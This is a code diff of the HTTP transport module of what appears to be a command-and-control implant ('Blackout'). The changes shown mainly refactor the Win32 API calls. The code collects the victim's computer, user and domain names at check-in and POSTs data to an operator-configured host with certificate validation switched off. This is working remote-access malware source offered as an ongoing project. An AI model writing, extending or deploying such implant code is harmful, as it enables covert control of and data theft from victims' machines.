@@ -38,7 +38,6 @@ FUNC BOOL TransportInit()
     // PackageAddPad( Package, Blackout.Config.AES.IV,  16 );
     
     PackageAddInt32(   Package, Instance()->Session.AgentId       );
-        BK_PRINT( "fodase %s\n", Instance()->System.ComputerName );
     PackageAddString(  Package, Instance()->System.ComputerName   );
     PackageAddString(  Package, Instance()->System.UserName       );
     PackageAddString(  Package, Instance()->System.DomainName     );
@@ -102,7 +101,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = FALSE;
 
-    hSession = Instance()->Win32.WinHttpOpen( Transport().Http.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+    hSession = Win32().WinHttpOpen( Transport().Http.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
     if ( ! hSession )
     {
         BK_PRINT( "[HTTP] WinHttpOpen: Failed => %d\n", NtGetLastError() );
@@ -110,7 +109,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
         goto LEAVE;
     }
 
-    hConnect = Instance()->Win32.WinHttpConnect( hSession, Transport().Http.Host, Transport().Http.Port, 0 );
+    hConnect = Win32().WinHttpConnect( hSession, Transport().Http.Host, Transport().Http.Port, 0 );
     BK_PRINT( "[HTTP] > WinHttpConnect=> %d\n", NtGetLastError() );
     if ( ! hConnect )
     {
@@ -126,7 +125,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
         HttpFlags |= WINHTTP_FLAG_SECURE;
     }
 
-    hRequest = Instance()->Win32.WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
+    hRequest = Win32().WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
     BK_PRINT( "[HTTP] > WinHttpOpenRequest=> %d\n", NtGetLastError() );
 
     if ( ! hRequest )
@@ -142,7 +141,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-        if ( ! Instance()->Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
+        if ( ! Win32().WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
         {
             BK_PRINT( "[HTTP] WinHttpSetOption: Failed => %d\n", NtGetLastError() );
         }else{
@@ -151,14 +150,14 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
         }
     }
 
-    if ( Instance()->Win32.WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, 0x0 ) )
+    if ( Win32().WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, 0x0 ) )
     {
-        if ( RecvData && Instance()->Win32.WinHttpReceiveResponse( hRequest, NULL ) )
+        if ( RecvData && Win32().WinHttpReceiveResponse( hRequest, NULL ) )
         {
             RespBuffer = NULL;
             do
             {
-                Successful = Instance()->Win32.WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
+                Successful = Win32().WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
                 if ( ! Successful || BufRead == 0 )
                 {
                     if ( ! Successful )
@@ -167,9 +166,9 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
                 }
 
                 if ( ! RespBuffer )
-                    RespBuffer = Instance()->Win32.LocalAlloc( LPTR, BufRead );
+                    RespBuffer = Win32().LocalAlloc( LPTR, BufRead );
                 else
-                    RespBuffer = Instance()->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
+                    RespBuffer = Win32().LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
 
                 RespSize += BufRead;
 
@@ -200,9 +199,9 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
     }
 
 LEAVE:
-    Instance()->Win32.WinHttpCloseHandle( hSession );
-    Instance()->Win32.WinHttpCloseHandle( hConnect );
-    Instance()->Win32.WinHttpCloseHandle( hRequest );
+    Win32().WinHttpCloseHandle( hSession );
+    Win32().WinHttpCloseHandle( hConnect );
+    Win32().WinHttpCloseHandle( hRequest );
 
     return Successful;
 }
